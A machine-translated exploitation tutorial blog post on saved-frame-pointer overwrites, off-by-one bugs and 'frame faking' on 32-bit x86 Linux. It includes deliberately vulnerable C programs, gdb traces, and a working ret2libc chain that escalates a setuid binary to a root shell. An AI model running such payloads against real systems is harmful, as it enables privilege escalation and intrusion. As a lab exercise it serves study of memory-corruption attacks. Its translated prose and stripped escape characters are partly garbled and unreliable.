---
layout: blog-detail
title: "Starting (from) the base: Attacks to base/frame pointer (EBP)"
date: 2018-07-21T19:59:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - buffer overflow
    - exploit
    - exploitiing
    - falseo frames
    - frame faking
    - frame pointer overwrite
    - off-by-one
    - x86
image_src: /assets/uploads/2018/07/puffinsecurity-partiendo-la-base-exploiting-ciberseguridad.jpg
image_height: 1280
image_width: 1920
author: Yago Gutierrez
description: Good afternoon, evening, or whatever it may be. Finally comes the awaited (?) Episode on attack base / frame pointer (EBP). Without further ado, let&#8217;s start function, even with two-way XDD (this is not in itself another preamble also???). So far, we have studied the...
publish_time: 2018-07-21T19:59:00+00:00
modified_time: 2019-11-13T08:25:58+00:00
comments_value: 0
disqus_identifier: 617
---
Good afternoon, evening, or whatever it may be. Finally comes the awaited (?) Episode on attack base / frame pointer (EBP). Without further ado, let’s start function, even with two-way XDD (this is not in itself another preamble also???).

So far, we have studied the overwrite EIP(s) for a subsequent `ret` instruction make us lord and master of the process.

However, it does not always have this opportunity and we need a little dirtier hands. Sometimes a program only allows full or partial overwrite the `EBP(s)`, the EBP saved during the function prolog.

I must clarify that this technique is applicable only to programs/functions that have omitted the use of the frame pointer (compiled without the option of gcc `--fomit-frame-pointer`).

I personally know, which describes for the first time this type of attack is in Article [The Frame Pointer Overwrite](http://phrack.org/issues/55/8.html), Phrack (where else …). In the same code as exploitable it presented by this technique.

#include <stdio.h>

func(char \*sm)  
{  
char buffer\[256\];  
int i;  
for(i=0;i<=256;i++)  
buffer\[i\]=sm\[i\];  
}

main(int argc, char \*argv\[\])  
{  
if (argc < 2) {  
printf(“missing argsn”);  
exit(-1);  
}

func(argv\[1\]);  
}

The vulnerability is in code, and I hope that most people would have already seen that in the field condition in the `for` is employing a `<=` instead of `<`. This causes instead of copying 256 bytes are copied 257, which, being the buffer of 256 bytes, can overwrite the last byte of `EBP(s)`. This type of vulnerability has the logo _**off-by-one**_. It is similar to a typical psychological error that suggests that to divide a space into 10 parts is necessary to use 10 sticks when actually required 9:

   |   |   |   |   |   |   |   |   |
 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10
   |   |   |   |   |   |   |   |   |
   1   2   3   4   5   6   7   8   9

If you are one of those who had given the wrong answer, nothing happens, some in the world are more special than others, and you’re one of those. It’s nothing bad, it’s … different. Well, once we clarified that it should not affect your self-esteem, let us proceed. (Incidentally, the name called this as [_Error fencepost_](https://en.wikipedia.org/wiki/Off-by-one_error#Fencepost_error) And there are variants).

But before we have a little problem today (at least gcc) compilers place buffers at the end of the stack (precisely as a security measure), so that, in our case, to compile with gcc, the variable is set <code>i</code> between our buffer and <code>EBP(s)</code>. Let’s change it then to implement the technique today, but first we will study the difference that makes exploitable (although it can occur in other real-world situations, this necessarily change is not necessary).

0804843b <func>:
 804843b: 55                    push   %ebp
 804843c: 89 e5                 mov    %esp,%ebp
 804843e: 81 ec 10 01 00 00     sub    $0x110,%esp
 8048444: c7 45 fc 00 00 00 00  movl   $0x0,-0x4(%ebp)
 804844b: eb 1c                 jmp    8048469 <func+0x2e>

Disassembled for code generated with `gcc -fno-stack-protector -no-pie -fno-pie -fno-pic -m32 -D_FORTIFY_SOURCE=0` on Klog code (the Phrack article).

It shows how after the prologue 0 are the four bytes below `EBP(s)` (`movl $0x0, -0x4(%ebp)`), this space corresponds to `i`. Then the loop with the JMP instruction is started.

Modified code

#include <stdio.h>
#include <stdlib.h>

void func(char \*sm)  
{  
char buffer\[256\];  
volatile int i;  
for(i = 0; i <= 256; i++)  
buffer\[i\] = sm\[i\];  
return;  
}

int main(int argc, char\*\* argv)  
{  
if (argc < 2)  
{  
printf(“Missing argsn”);  
return -1;  
}

func(argv\[1\]);

return 0;  
}

I have included some modifications that represent good taste and good practices, as I do not like not to see that the compiler display warnings. These changes should only affect the behavior of the program (except the `return`‘s) is the `volatile` keyword. If you want to know exactly what makes that keyword, this is not a manual of C, and C should know before coming here, so I get out I will throw you the dogs.

0804843b <func>:
 804843b: 55                    push   ebp
 804843c: 89 e5                 mov    ebp,esp
 804843e: 81 ec 10 01 00 00     sub    esp,0x110
 8048444: c7 85 fc fe ff ff 00  mov    DWORD PTR \[ebp-0x104\],0x0
 804844b: 00 00 00 
 804844e: eb 2c                 jmp    804847c <func+0x41>

Disassembled for the modified code, gcc same command as above (this syntax Intel because the variety is good) .Now 0x00000000 is a space that is far below the `EBP(s)` (`mov DWORD PTR [ebp-0x104],0x0`), because now is the variable `i` after the buffer. Note that in both cases the stack frame is exactly the same size (`sub esp,0x110`).

Let’s see how modifying the saved EBP gives us program control.

At the end of the function, during the epilogue, we find a `leave` instruction equivalent to `mov esp, ebp ; pop ebp`, which would put the value in the EBP we’ve located where the saved EBP. `ret` is executed and returned to the function _caller_, when get to `leave`this function will increase from EBP to ESP the value we have set in EBP finally `ret`, which equates to a `pop eip`course will run, namely that placed in the instruction pointer value containing the address pointed to by ESP (which control us). If we make ESP points to an address containing data provided by us. we can locate in EIP an arbitrary value. We should note that between `leave` and `ret` (the _caller_) may have further instructions, especially `pop`‘s, which increase or decrease (the latter crossed out because it is very unlikely, remember that it is the end of a function and that is falling apart the stack frame) the value of ESP; in fact, `leave` it contains a `pop ebp`, forcing us to put a value of at least 4 bytes less than that interests us (as the `pop` above will increase it in those 4 bytes). And it is indeed where more safely see the advantages in the eyes of a (?) Of course (?) Attacking offers _**little endian**_, and is that being located the last byte closer to the buffer on the stack, allows us handle it as an offset, while in a _big endian_ platform could overwrite the high byte, which would make us be the ESP bars, far away from our fruit, because the entire stack is framed in directions that share the first two bytes, which would make impossible the _off-by-one_. Therefore, at least when it operates an _off-by-one_, we are interested in a _little endian_ system.

Buuut … We have another problem, and that is, as we saw some time ago, the `main()`function is special, or at least I think compilers, so use your stack as you think, making it a hodgepodge pointers and values ​​stored records, it does not unworkable, in fact in this case with gcc version `6.3.0 20170516` (for a problem with my archlinux gnome’ve had to temporarily move to debian stretch until it is fixed, so I have a version more than a year ago, is the _stable_ repository) ends allowing modify the entire ESP, but as we operate an _off-by-one_ we should only allow modify the last byte. So let’s change the program again. Yes, I know.

#include <stdio.h>
#include <stdlib.h>

void f2(char \*sm)  
{  
char buffer\[256\];  
volatile int i;  
for(i = 0; i <= 256; i++)  
buffer\[i\] = sm\[i\];  
return;  
}

void f1(char\* arg)  
{  
f2(arg);  
return;  
}

int main(int argc, char \*argv\[\])  
{  
if (argc < 2)  
{  
printf(“missing argsn”);  
exit(-1);  
}

f1(argv\[1\]);

return 0;  
}

Okay, let’s take up our best steel (**gdb**) and start placing breakpoints in interesting points  

$ gdb -q a
Reading symbols from a...(no debugging symbols found)...done.
(gdb) disas f2
Dump of assembler code for function f2:
   0x0804843b <+0>:  push   %ebp
   0x0804843c <+1>:  mov    %esp,%ebp
   0x0804843e <+3>:  sub    $0x110,%esp
   0x08048444 <+9>:  movl   $0x0,-0x104(%ebp)
   0x0804844e <+19>: jmp    0x804847c <f2+65>
   0x08048450 <+21>: mov    -0x104(%ebp),%eax
   0x08048456 <+27>: mov    -0x104(%ebp),%edx
   0x0804845c <+33>: mov    %edx,%ecx
   0x0804845e <+35>: mov    0x8(%ebp),%edx
   0x08048461 <+38>: add    %ecx,%edx
   0x08048463 <+40>: movzbl (%edx),%edx
   0x08048466 <+43>: mov    %dl,-0x100(%ebp,%eax,1)
   0x0804846d <+50>: mov    -0x104(%ebp),%eax
   0x08048473 <+56>: add    $0x1,%eax
   0x08048476 <+59>: mov    %eax,-0x104(%ebp)
   0x0804847c <+65>: mov    -0x104(%ebp),%eax
   0x08048482 <+71>: cmp    $0x100,%eax
   0x08048487 <+76>: jle    0x8048450 <f2+21>
   0x08048489 <+78>: nop
   0x0804848a <+79>: leave  
   0x0804848b <+80>: ret    
End of assembler dump.
(gdb) disas f1
Dump of assembler code for function f1:
   0x0804848c <+0>:  push   %ebp
   0x0804848d <+1>:  mov    %esp,%ebp
   0x0804848f <+3>:  pushl  0x8(%ebp)
   0x08048492 <+6>:  call   0x804843b <f2>
   0x08048497 <+11>: add    $0x4,%esp
   0x0804849a <+14>: nop
   0x0804849b <+15>: leave  
   0x0804849c <+16>: ret    
End of assembler dump.
(gdb) br f2
Breakpoint 1 at 0x8048444
(gdb) br \*f2+79
Breakpoint 2 at 0x804848a
(gdb) br \*f1+15
Breakpoint 3 at 0x804849b
(gdb) display /i $pc
1: x/i $pc
<error: No registers.>
(gdb)

Now let’s look at the different situations.

(gdb) run \`perl -e 'print "A"x256 . "X"'\`
Starting program: /home/arget/a \`perl -e 'print "A"x256 . "X"'\`

Breakpoint 1, 0x08048444 in f2 ()  
1: x/i $pc  
\=> 0x8048444 <f2+9>: movl $0x0,-0x104(%ebp)  
(gdb)

We have introduced 256 bytes ‘A’ and byte ‘X’. Would not mind introducing more characters, only the last byte of EBP is overwritten, as the number of bytes to be copied is a constant: 257.

(gdb) x $ebp
0xffffd23c: 0xffffd248
(gdb)

Now we see that `EBP(s)` worth 0xffffd248. Let’s see what happens after the loop.

(gdb) c
Continuing.

Breakpoint 2, 0x0804848a in f2 ()  
1: x/i $pc  
\=> 0x804848a <f2+79>: leave  
(gdb) x $ebp  
0xffffd23c: 0xffffd258  
(gdb)

Just before the `leave`, `EBP(s)` `0xffffd258` worth being 0x58 value ‘X’, it shows that we have overwritten the last byte.

(gdb) i r ebp esp
ebp            0xffffd23c 0xffffd23c
esp            0xffffd12c 0xffffd12c
(gdb) nexti
0x0804848b in f2 ()
1: x/i $pc
=> 0x804848b <f2+80>: ret    
(gdb) i r ebp esp
ebp            0xffffd258 0xffffd258
esp            0xffffd240 0xffffd240
(gdb)

We now see how the implementation of EBP `leave` our little place in the value. Continue to `leave` the caller function (`f1()`), the critical point.

(gdb) c
Continuing.

Breakpoint 3, 0x0804849b in f1 ()  
1: x/i $pc  
\=> 0x804849b <f1+15>: leave  
(gdb) i r ebp esp  
ebp 0xffffd258 0xffffd258  
esp 0xffffd248 0xffffd248  
(gdb) nexti  
0x0804849c in f1 ()  
1: x/i $pc  
\=> 0x804849c <f1+16>: ret  
(gdb) i r ebp esp  
ebp 0xffffd320 0xffffd320  
esp 0xffffd25c 0xffffd25c  
(gdb)

Well, we ended with 0x5c in the low byte of the ESP, which, by chance (light), is `0x58 + 4`, as could provide (as the `pop ebp` within `leave` increases the ESP in 4 bytes). now, the `ret` collect whatever containing the address pointed to by ESP, that is, by chance (now without irony), 0x08048511, which falls in `__libc_csu_init()`, so it returns to `__libc_csu_init()` when in fact the program should return to `main()`.

(gdb) x $esp
0xffffd25c: 0x08048511
(gdb) nexti
0x08048511 in \_\_libc\_csu\_init ()
1: x/i $pc
=> 0x8048511 <\_\_libc\_csu\_init+33>: lea    -0xf8(%ebx),%eax
(gdb)

And demonstrate that by placing in an arbitrary direction saved EBP obtain control of the second EIP `leave;ret` running, the condition is placed in the EBP saved an address that points to our fruit. Note that this usually is only viable if it is in a system without ASLR, since neither we at this stage of the attack with the ability to perform more complex attacks, _aka_ ROP, and to make matters worse, play in the playground more slippery the world: the stack. Moreover, without ASLR do have the ability to ropp because ESP points to our fruit, and we have so much space as to the `EBP(s)`. However, we will see a kind of ROP called _frame faking_ that can be more useful on certain occasions.

Anyway, no one forbids us to practice, right?

``(gdb) run `perl -e 'print "A"x208 . "x10x83x04x08" . "AAAA" . "x05" . "A"x39 . "x08"'`  
Starting program: /home/arget/a `perl -e 'print "A"x208 . "x10x83x04x08" . "AAAA" . "x05" . "A"x39 . "x08"'`  
[Inferior 1 (process 4233) exited with code 05]``

Simply call the exit() function from the FPE, with 0x41414105 argument, but, as we have seen, exit() returns as a return value of the program only the last byte of the argument, so gdb tells us that has value dated 05 demonstrating successful frankly simple (<2 minutes xd) exploitation.

You can see that the value overwritten `EBP(s)` is 0x08, to be increased by 4 and get to 0x0c (the value that I chose, for whatever reason now describe). This is because the `EBP(s)` contains first three bytes 0xffffd2 .. while our fruit starts with 0xffffd1 .. although by looking up addresses our fruit, we see that part of the fruit (60 bytes neither more nor less ) are also in 0xffffd2 … Within those addresses whose penultimate byte 0xD2 pointing to our fruit, I took an offset anyone other than 0x00: 0x0c. I’ll be honest, I took the smallest offset whose direction was clear in gdb without add but would have been better to use the offset 0x01 if it is recommended that alignment with 0xF is maintained, so it would be better to use 0x4 (or 0x00, but is a null byte: $) -. After calculating what part of our fruit is in that direction (`0xffffd20c`), put there the direction we want to lie in the EIP, and, like a ROP it were, can string together functions falsifying more frames using as gadget one `leave;ret`. This technique has a name, _**frame faking**_ or falsify frames.

_**Frame Faking**: _When you upload a picture and fix it as you can, to see if it sneaks in (and I if not, …)__

This technique (described in an interesting article … no, I will not say again, [The advanced return-into-lib (c) exploits: case study PaX](http://phrack.org/issues/58/4.html) Nergal) is just another way to make a ROPchain, perhaps somewhat more complicated, but can be useful, especially when you do not have the ability to write beyond the `EIP(s)`, or if not available gadgets that allow jump the arguments of a function that must be called.

Here we will exploit a program that will allow us to overwrite to `EIP(s)`, as we have already seen _off-by-one_, however it is also possible to exploit this technique in programs that allow only overwrite the EBP whole or in part, the case is gain control of ESP.

#include <stdio.h>
#include <string.h>

char\* get\_ebp()  
{  
asm(“mov (%ebp), %eax”);  
}

void func(char \*p)  
{  
char buffer\[128\];  
volatile int i;

/\* i stores the distance from the beginning of the buffer to EIP(s) included \*/  
i = get\_ebp() – buffer + 4 + 4;

strncpy(buffer, p, i);  
return;  
}

int main(int argc, char\*\* argv)  
{  
if (argc < 2)  
{  
printf(“Missing argsn”);  
return -1;  
}  
func(argv\[1\]);  
return 0;  
}

Come on, get ready to make an ASCII graph of these precious things.

Note that leave first moves from EBP to ESP, so that the `pop ebp` EBP gather in the value of the site now pointing ESP. So, the second value that will remain in EBP is the beginning of the buffer, as the first `leave` (the treader `EIP(s)`) will move first to ESP address buffer, so the back `pop ebp` within the `leave` will collect in EBP which contains the beginning of buffer. This game is the one that is maintained throughout the operation.

`Note: addresses that are used herein are false, they do not follow a real even scheme.`

High addresses  
+——————-+  
| &leave;ret | EIP(s) (placed 1st ESP EBP false and gather in the 2nd EBP EBP false)  
+——————-+  
| &buffer | EBP(s) (first false EBP)  
+——————-+ <- EBP (initially)  
| … | extra space, we know compilers: more filling (8 bytes)  
+——————-+  
| Filling (8 bytes) |  
+——————-+  
| Filling | Argument to exit(), gives us a bit like the return value  
+——————-+  
| &”/bin/sh” | Argument for system()  
+——————-+  
| &exit() | TWe ended cleanly, not lose after the last pirouette balance  
+——————-+  
| &system() | We run our star finally exercise  
+——————-+  
| 0xffffd1ff | EBP seventh false, counterfeit tickets here  
+——————-+ <- 0xffffd1ee  
| Filling | Argument to setuid (), have been writing here’s the strcpy’s 0x00  
+——————-+ <- 0xffffaaaa/bb/cc/dd  
| &leave;ret | (ESP = 0xffffd1ee, EBP = 0xffffd1ff)  
+——————-+  
| &setuid() |  
+——————-+  
| 0xffffd1ee | EBP sixth false, smacking leave after the 4th strcpy  
+——————-+ <- 0xffffd1dd  
| &(0x00) | (Second arg to strcpy())  
+——————-+  
| 0xffffaadd | (First arg to strcpy())  
+——————-+  
| &leave;ret | (ESP = 0xffffd1dd, EBP = 0xffffd1ee)  
+——————-+  
| &strcpy() | Fourth strcpy() (and last, at eh end)  
+——————-+  
| 0xffffd1dd | Fifth false EBP, is the dinner of leave after 3rd strcpy  
+——————-+ <- 0xffffd1cc  
| &(0x00) | (Second arg to strcpy())  
+——————-+  
| 0xffffaacc | (First arg to strcpy())  
+——————-+  
| &leave;ret | (ESP = 0xffffd1cc, EBP = 0xffffd1dd)  
+——————-+  
| &strcpy() | Third strcpy()  
+——————-+  
| 0xffffd1cc | Fourth false EBP, he eats the leave after 2nd strcpy  
+——————-+ <- 0xffffd1bb  
| &(0x00) | (Second arg to strcpy())  
+——————-+  
| 0xffffaabb | (First arg to strcpy())  
+——————-+  
| &leave;ret | (it will put 0xffffd1bb in ESP, 0xffffd1cc in EBP)  
+——————-+  
| &strcpy() | Second strcpy()  
+——————-+  
| 0xffffd1bb | Third false EBP, this will be collected in EBP the leave after the 1st strcpy  
+——————-+ <- 0xffffd1aa  
| &(0x00) | (second arg —source— to strcpy())  
+——————-+  
| 0xffffaaaa | (first arg —dest— to strcpy())  
+——————-+  
| &leave;ret | (it will put 0xffffd1aa in ESP, then the ebp pop will be executed in that direction, EBP = 0xffffd1bb)  
+——————-+  
| &strcpy() | 1er strcpy. This will be collected by the ret of our first gadget  
+——————-+  
| 0xffffd1aa |Second false EBP, will be picked up by the leave stepping on EIP (s)  
+——————-+ <- buffer (128 bytes)  
| … |  
+——————-+ <- ESP (initially)  
Low addresses

Basically, it back so crazy to ESP and EBP registers as possible, at the end are the most disoriented a compass in a washing poor, but that we are here, we are a light in the darkness.  
It must take into account that probably more space is required than for a normal ROP. In our case we have occupied 120 bytes.

Well, we get directions (in gdb not forget `unset environment LINES` and `unset environment COLUMNS`) and replace the skeleton that we have previously mounted. Knowing that:  
0xf7e776a0 <strcpy> (gdb)

0xf7eb3d60 <setuid> (gdb)  
0xf7e30800 <exit> nope (byte 0x00 and earlier dirs not worth) -> 0xf7eb35c5 <\_exit> (gdb btoh)

0x08048484 <+64>: leave  
0x08048485 <+65>: ret (gdb)

80482fc: 00 (objdump)  
0xf7f5ecc8 : /bin/sh (ROPgadget)

y &buffer = 0xffffd240 (gdb)

The problem is that the address strcpy() (obtained from gdb by `p strcpy`) for some reason did nothing, that is, the `dest` and `source` correct arguments being, the first writable and the second legible, did not change anything, it is ie the 0x00 byte that was copied to the `dest` address was not copied, and it was no problem permissions address as it would have given SIGFAULT or SIGILL, but the execution was still perfectly, in fact it was obtained shell, only the setuid he received as an argument ran filling that we placed in his argument, preventing obtain the root.

I figured it would be some internal issue of libc, which, when compiling, preprocessor directives determine a strcpy() or another (there are several versions of some functions), but finally I think the problem lies elsewhere.

The fact is that to determine where calls a compiled with gcc on my machine when you want to access strcpy() program, I make a little program that will help us do so.

$ cat b.c
#include <stdio.h>
#include <string.h>

int main()  
{  
char a\[\] = “asd”;  
char b\[4\];  
strcpy(b, a);  
return 0;  
}

$ gdb -q b  
Reading symbols from b…(no debugging symbols found)…done.  
(gdb) disas main  
Dump of assembler code for function main:  
0x0804840b <+0>: lea 0x4(%esp),%ecx  
0x0804840f <+4>: and $0xfffffff0,%esp  
0x08048412 <+7>: pushl -0x4(%ecx)  
0x08048415 <+10>: push %ebp  
0x08048416 <+11>: mov %esp,%ebp  
0x08048418 <+13>: push %ecx  
0x08048419 <+14>: sub $0x14,%esp  
0x0804841c <+17>: movl $0x647361,-0xc(%ebp)  
0x08048423 <+24>: sub $0x8,%esp  
0x08048426 <+27>: lea -0xc(%ebp),%eax  
0x08048429 <+30>: push %eax  
0x0804842a <+31>: lea -0x10(%ebp),%eax  
0x0804842d <+34>: push %eax  
0x0804842e <+35>: call 0x80482e0 <strcpy@plt>  
0x08048433 <+40>: add $0x10,%esp  
0x08048436 <+43>: mov $0x0,%eax  
0x0804843b <+48>: mov -0x4(%ebp),%ecx  
0x0804843e <+51>: leave  
0x0804843f <+52>: lea -0x4(%ecx),%esp  
0x08048442 <+55>: ret  
End of assembler dump.  
(gdb) br \*main +40  
Breakpoint 1 at 0x8048433  
(gdb) run  
Starting program: /home/arget/b

Breakpoint 1, 0x08048433 in main ()  
(gdb) x/i 0080482e0  
0x13a62: Cannot access memory at address 0x13a62  
(gdb) x/i 0x80482e0  
0x80482e0 <strcpy@plt>: jmp \*0x804a00c  
(gdb) x/wx 0x0804a00c  
0x804a00c: 0xf7e89420  
(gdb)

Well, where we see is actually called when a strcpy() is executed. It is best that no symbol covers this function:  
`(gdb) disas 0xf7e89420  
No function contains specified address.`  
Let’s see at least what the first direction is:  

(gdb) x/i 0xf7e89420
   0xf7e89420: mov    0x4(%esp),%edx

Let’s see which direction this function should be placed in the vuln program. However, this is not necessary because the library is loaded in the same direction for both programs:

$ ldd b | grep libc
 libc.so.6 => /lib32/libc.so.6 (0xf7e02000)
$ ldd vuln | grep libc
 libc.so.6 => /lib32/libc.so.6 (0xf7e02000)

However we can check, just to demonstrate.

If in the program b, function is in 0xf7e89420 and the library is loaded into 0xf7e02000, the offset of the function within the library is `0xf7e89420 - 0xf7e02000 = 0x87420`.

We can easily check:

`$ objdump -d /lib32/libc.so.6 | grep 87420  
87420: 8b 54 24 04 mov 0x4(%esp),%edx`

Indeed, it is the same instruction we see in the program b found in the 0xf7e89420 direction. Now this offset would add to the direction in which the library for the vuln program, which, as we see with `ldd`, is 0xf7e02000 load. `0x87420 + 0xf7e02000 = 0xf7e89420`. Which happens to be the same direction as we have seen in b (what a surprise, `a + b - b = a`, if I told you, but you neither case). Let’s do the last check:

$ gdb -q vuln
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x8048494
Starting program: /home/arget/vuln

Temporary breakpoint 1, 0x08048494 in main ()  
(gdb) x/i 0xf7e89420  
0xf7e89420: mov 0x4(%esp),%edx  
(gdb)

Well, that’s it. We are going to explode.  

$ cat vuln.c
#include <stdio.h>
#include <string.h>

char\* get\_ebp()  
{  
asm(“mov (%ebp), %eax”);  
}

void func(char \*p)  
{  
char buffer\[128\];  
volatile int i;

/\* i stores the distance from the beginning of the buffer to EIP(s) included \*/  
i = get\_ebp() – buffer + 4 + 4;

strncpy(buffer, p, i);  
return;  
}

int main(int argc, char\*\* argv)  
{  
if (argc < 2)  
{  
printf(“Missing argsn”);  
return -1;  
}  
func(argv\[1\]);  
return 0;  
}  
$ gcc vuln.c -o vuln -m32 -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -no-pie -fno-pie -fno-pic  
$ /home/arget/vuln “\`perl -e ‘print  
“x54xd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9cxd2xffxff” . “xfcx82x04x08” .  
“x68xd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9dxd2xffxff” . “xfcx82x04x08” .  
“x7cxd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9exd2xffxff” . “xfcx82x04x08” .  
“x90xd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9fxd2xffxff” . “xfcx82x04x08” .  
“xa0xd2xffxff” . “x60x3dxebxf7” . “x84x84x04x08” .  
“ARGT” . # Este ARGT es el argumento para setuid()  
“xa4xd2xffxff” . “x50xc8xe3xf7” . “xc5x35xebxf7” . “xc8xecxf5xf7” .  
“x01AGT” . # Argumento para exit()  
“C”x20 . # Relleno final  
“x40xd2xffxff” . “x84x84x04x08″‘\`”  
$

\### Baia, guarden la calma ###

$ sudo chown root:root vuln  
\[sudo\] password for arget:  
$ sudo chmod u+s vuln  
$ /home/arget/vuln “\`perl -e ‘print  
“x54xd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9cxd2xffxff” . “xfcx82x04x08” .  
“x68xd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9dxd2xffxff” . “xfcx82x04x08” .  
“x7cxd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9exd2xffxff” . “xfcx82x04x08” .  
“x90xd2xffxff” . “x20x94xe8xf7” . “x84x84x04x08” . “x9fxd2xffxff” . “xfcx82x04x08” .  
“xa0xd2xffxff” . “x60x3dxebxf7” . “x84x84x04x08” .  
“ARGT” . # This ARGT is the argument to setuid()  
“xa4xd2xffxff” . “x50xc8xe3xf7” . “xc5x35xebxf7” . “xc8xecxf5xf7” .  
“x01AGT” . # Argumento para exit()  
“C”x20 . # Relleno final  
“x40xd2xffxff” . “x84x84x04x08″‘\`”  
\# whoami  
root  
#

`EBP falso - strcpy() - &leave;ret - arg1 - arg2` scheme is clearly seen the first 4 lines. Later the scheme `EBP falso - función() - &leave;ret - arg`. for setuid() functions and system(). As exit() does not return not need false frame. Come end of the function (yes, again with double meaning). Hopefully in this epilogue not collect any false frame. Good afternoon.

We resume the CBC itself. On this occasion I propose to find an original way to solve the challenge presented in the post [ret2libc: firing his own gun](/ret2libc-disparando-con-su-propia-pistola/). This challenge has already been presented two solutions in post ROP: In exploiting and love anything goes (One in the solutionary and another in through the post).

Now Yes, good evening, evenings…